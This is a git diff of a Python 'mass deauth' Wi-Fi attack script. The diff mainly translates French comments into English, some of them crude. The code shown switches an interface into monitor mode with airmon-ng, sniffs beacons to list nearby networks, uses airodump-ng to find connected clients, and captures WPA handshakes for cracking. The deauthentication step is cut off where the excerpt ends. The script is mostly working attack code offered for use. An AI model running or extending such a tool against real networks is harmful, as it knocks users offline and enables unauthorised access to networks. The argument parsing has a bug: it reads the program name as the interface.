@@ -48,10 +48,11 @@ def main():
     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
 
         """)
-    # pour le --help
+    # for the --help
     parser = argparse.ArgumentParser(description='Mass Deauth wifi script\n\n Give to the script the interface name and the monitor interface name [without this wlan0 by default]')
     args = parser.parse_args()
-    #verif droit sudo 
+
+    #sudo verification
     if not os.geteuid() == 0:
         print(BOLD, RED,f"[!] SUDO requied, please make a sudo command")
         sys.exit()
@@ -60,24 +61,24 @@ def main():
 main()
 
 
-#conf si le user n'a rien mis
+#default configuration 
 if len(sys.argv) < 2:
     print(GREEN,"[+] Okay ! by default wlan0 interface !", RESET)
     interface = "wlan0"
     wlanmon = "wlan0"
 
-#conf si ya bien les args
+#user config
 if len(sys.argv) > 2:
     interface = sys.argv[0]
     wlanmon = sys.argv[1]
 
-# mode Monitor
+#Monitor mode
 os.system("airmon-ng check kill  > /dev/null")
 os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output
 time.sleep(3)
 
 
-# Fonction pour scanner les réseaux WiFi
+# Wifi hotspot scan
 def scan_wifi_networks():
     global bssid_list, ssid_list
     networks = []
@@ -85,7 +86,7 @@ def scan_wifi_networks():
     ssid_list = []
     ssid_set = set()
 
-    # Fonction de rappel pour chaque paquet reçu
+    # Fonction for recieve packet
     def packet_handler(packet):
         global channel, bssid, ssid
         if packet.haslayer(Dot11Beacon):
@@ -98,12 +99,12 @@ def scan_wifi_networks():
                 bssid_list.append(bssid)
                 ssid_list.append(ssid)
                 
-    # Capture des paquets WiFi
+    # wifi sniffer command
     sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=packet_sniff_timeout)
 
     return networks
 
-# Fonction pour afficher les réseaux WiFi
+# Make a fucking beautifull print for Wifi Hotspot 
 def display_wifi_networks(networks):
     table = PrettyTable(["Adresse MAC", "Nom du réseau", "Canal"])
     for network in networks:
@@ -112,25 +113,27 @@ def display_wifi_networks(networks):
 
 networks = scan_wifi_networks()
 
-# Affichage des réseaux WiFi
+# Start the shitty print
 display_wifi_networks(networks)
 
+
+#command start with timeout
 def start_command(command, timeout):
     process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-    # Fonction pour tuer le processus si le timeout est atteint
+    # Kill process if timeout
     def kill_process(p):
         p.kill()
 
-    # Lancement du timer pour le timeout
+    # timer start for the timeout
     timer = Timer(timeout, kill_process, [process])
 
     try:
-        # Démarrage du timer et de l'exécution de la commande
+        # Time start + command start
         timer.start()
         output, error = process.communicate()
     finally:
-        # Annulation du timer
+        # Timer stop
         timer.cancel()
 
     return output.decode()
@@ -139,9 +142,10 @@ def start_command(command, timeout):
 
 def client_grab(mac_now, channel, ssid):
     global client
-    command = f"airodump-ng --bssid {mac_now} --channel {channel} {wlanmon}" # essaye de chopper le client
+    command = f"airodump-ng --bssid {mac_now} --channel {channel} {wlanmon}" # try to grab a client
     client_output = start_command(command, timeout_airodump_client)
-    # Utilisation de la regex pour grep le client
+
+    # Regex de mort for find a client in the output
     regex = rf'{mac_now}  ([A-F0-9:]+)'
     match = re.search(regex, client_output)
     if match:
@@ -166,7 +170,7 @@ def handshake_grab(mac, channel, ssid):
     command = f"airodump-ng --bssid {mac} --channel {channel} -w {out_filename} {wlanmon}" # essaye de chopper le handshake
     output_handshake = start_command(command, timeout_airodump_handshake)
 
-    # Utilisation de la regex pour grep le handshake
+    # Another regex de mort for find if the handshake was captured
     regex = r'WPA handshake: ([A-F0-9:]+)'
     match = re.search(regex, output_handshake)
     if match:
@@ -178,16 +182,16 @@ def handshake_grab(mac, channel, ssid):
 
 
 
-#prise d'infos (client pour deauth)
+#blablabla start all blabla
 if bssid_list:
     for mac, ssid in zip(bssid_list, ssid_list):
         
-        #pas besoin d'avoir le MAC du client pour deauth...
+        #uppercase the MAC address
         mac_now = mac.upper()
 
         def deauth_wifi(mac, interface):
         
-            #Grab le client
+            #Client grab
             client_grab(mac_now, channel, ssid)
 
             #requete de deauth pour le client
